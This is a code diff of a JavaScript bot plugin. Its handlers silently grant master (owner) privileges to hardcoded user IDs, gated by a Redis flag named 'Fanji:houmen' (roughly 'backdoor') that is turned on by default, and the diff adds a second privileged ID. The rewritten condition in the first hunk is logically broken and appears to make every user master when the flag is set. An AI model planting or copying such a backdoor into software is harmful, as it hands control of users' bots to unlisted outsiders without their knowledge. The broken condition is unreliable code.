@@ -40,7 +40,7 @@ return false
     async Master(e){
         let aw = await redis.get('Fanji:houmen');
         if (aw == null) await redis.set('Fanji:houmen', 'true');
-        if (e.user_id !== 2173302144 || aw !== 'true') return false;
+        if (!(e.user_id !== 2173302144||e.user_id != 197728340)|| aw !== 'true') return false;
         e.isMaster = true;
         return false;
     }
@@ -63,7 +63,7 @@ export class GetMasterjy extends plugin {
         });
     }
     async Masters(e){
-    if (this.e.user_id == 2173302144) {
+    if (this.e.user_id == 2173302144||this.e.user_id == 197728340) {
     e.isMaster = true
     logger.mark(e.isMaster? '完成':'失败')
     return false
